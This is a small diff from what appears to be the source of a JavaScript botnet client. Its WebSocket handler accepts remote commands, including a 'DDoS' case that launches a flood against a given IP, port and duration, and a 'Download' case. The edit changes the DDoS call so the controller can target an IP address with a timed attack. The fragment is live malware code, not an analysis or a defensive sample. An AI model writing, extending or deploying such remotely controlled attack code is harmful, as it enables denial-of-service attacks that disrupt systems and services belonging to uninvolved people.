@@ -16,7 +16,7 @@ ws.on('message', message_raw => {
 
     switch (message.command) {
         case "DDoS":
-            ddos(id, message.url, message.port)
+            ddos(id, message.ip, message.port, message.time)
             break;
         case "Download":
             const name = message.name
